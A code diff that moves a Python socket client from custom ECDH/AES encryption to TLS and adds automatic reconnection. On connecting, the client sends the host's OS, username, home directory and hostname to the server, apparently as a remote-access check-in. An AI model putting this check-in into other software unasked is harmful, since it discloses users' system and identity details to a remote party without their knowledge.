@@ -1,15 +1,13 @@
 """ Base Class for the Client, handles handshake, encryption and messages """
 import os
+import ssl
 import logging
 import socket
 import time
 import platform
 import getpass
 
-from cryptography.hazmat.primitives import hashes, padding, serialization
-from cryptography.hazmat.primitives.asymmetric import ec
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+from utils.helpers import run_till_true
 
 socket.setdefaulttimeout(10)
 
@@ -24,125 +22,55 @@ class Client:
 
     # Create socket
     sock = socket.socket()
-    address = None
-    cipher = None
+    ssl_sock: ssl.SSLSocket | None = None
+    address: tuple | None = None
 
-    # Padding for AES
-    pad = padding.PKCS7(256)
-
-    def __init__(self, public_key: ec.EllipticCurvePublicKey) -> None:
+    def __init__(self, context: ssl.SSLContext) -> None:
         """ Define a trusted certificate """
-        self.public_key = public_key
+        self.context = context
 
-    def connect(self, address: tuple) -> None:
+    @run_till_true
+    def connect(self, address: tuple, retry_in_seconds: int = 5) -> None:
         """ Connect to peer """
-        while True:
-            try:
-                self.sock.connect(address)
-            except ConnectionError:
-                # Socket is not open
-                continue
-            except OSError:
-                self.sock.close()
-                self.sock = socket.socket()
-                self.sock.settimeout(10.0)
-                time.sleep(1)
-                continue
 
-            try:
-                self.handshake()
-            except OSError as error:
-                logging.debug('Handshake with peer failed: %s', str(error))
-            else:
-                self.address = address
-                break
+        self.sock = socket.socket()
 
-    def handshake(self) -> None:
-        """
-        Handshake 
+        try:
+            self.sock.connect(address)
+        except ConnectionError:
+            # Socket is not open
+            return
+        except OSError:
+            self.sock.close()
+            time.sleep(retry_in_seconds)
+            return
 
-        Generate keypair
-        Exchange public keys
-        Verify signature
-        Generate shared session key
-        Server sends IV for AES256
-        Create AES cipher
-        """
+        try:
+            self.ssl_sock = self.context.wrap_socket(self.sock, server_hostname=address[0])
+        except ssl.SSLError as error:
+            logging.error("Error during ssl wrapping: %s", str(error))
+            return
 
-        # Keys used for session
-        private_key = ec.generate_private_key(ec.SECP521R1())
-        pem_public_key = private_key.public_key().public_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo
-        )
-        # Exchange public keys
-        serialized_peer_public_key = self._read()
-        self._write(pem_public_key)
-        signature = self._read()
+        # Get hostname
+        hostname = socket.gethostname()
+        # Remove .local ending on macos
+        if platform.system() == "Darwin" and hostname.endswith(".local"):
+            hostname = hostname[:-len(".local")]
 
-        # Verify signature
-        self.public_key.verify(
-            signature,
-            serialized_peer_public_key,
-            ec.ECDSA(hashes.SHA512())
-        )
-
-        # Exchange private and peer public key for shared key
-        peer_public_key = serialization.load_pem_public_key(serialized_peer_public_key)
-        shared_key = private_key.exchange(ec.ECDH(), peer_public_key)
-
-        # Derive key
-        derived_key = HKDF(
-            algorithm=hashes.SHA512(),
-            length=32,
-            salt=None,
-            info=None
-        ).derive(shared_key)
-
-        # Share IV for AES
-        iv = self._read()
-
-        self.cipher = Cipher(
-            algorithm=algorithms.AES256(derived_key),
-            mode=modes.CBC(iv)
-        )
-
-        # Send system information
+        # Send system information to server
         info = f'{platform.system()}\n{getpass.getuser()}\n' \
-            f'{os.path.expanduser("~")}\n{socket.gethostname()}'
+            f'{os.path.expanduser("~")}\n{hostname}'
         self.write(info.encode())
 
-        logging.info('Handshake completed successfully')
+        self.address = address
+        return True
 
-    def _encrypt(self, data: bytes) -> bytes:
-        """ Encrypt data """
-        # Pad data
-        padder = self.pad.padder()
-        padded_data = padder.update(data) + padder.finalize()
 
-        # Encrypt padded data
-        encryptor = self.cipher.encryptor()
-        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
-
-        return encrypted_data
-
-    def _decrypt(self, data: bytes) -> bytes:
-        """ Decrypt data """
-        # Decrypt data
-        decryptor = self.cipher.decryptor()
-        decrypted_data = decryptor.update(data) + decryptor.finalize()
-
-        # Unpad data
-        unpadder = self.pad.unpadder()
-        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
-
-        return unpadded_data
-
-    def __read(self, amount: int) -> bytes:
+    def _read(self, amount: int) -> bytes:
         """ Receive raw data from peer """
         data = b''
         while len(data) < amount:
-            buffer = self.sock.recv(amount)
+            buffer = self.ssl_sock.recv(amount)
             if not buffer:
                 # Assume connection was closed
                 logging.error('Assuming connection was closed: %s', str(self.address))
@@ -151,23 +79,15 @@ class Client:
 
         return data
 
-    def _read(self) -> bytes:
+    def read(self) -> bytes:
         """ Read messages from client """
-        header = self.__read(self.header_length)
+        header = self._read(self.header_length)
         message_length = int.from_bytes(header, 'big')
-        return self.__read(message_length)
+        return self._read(message_length)
 
-    def _write(self, data: bytes) -> None:
+    def write(self, data: bytes) -> None:
         """ Write message data to peer """
         # Create header for data
         header = len(data).to_bytes(self.header_length, byteorder='big')
         message = header + data
-        self.sock.sendall(message)
-
-    def read(self) -> bytes:
-        """ Read encrypted messages from peer """
-        return self._decrypt(self._read())
-
-    def write(self, data: bytes) -> bool:
-        """ Encrypt and write data to peer """
-        return self._write(self._encrypt(data))
+        self.ssl_sock.sendall(message)
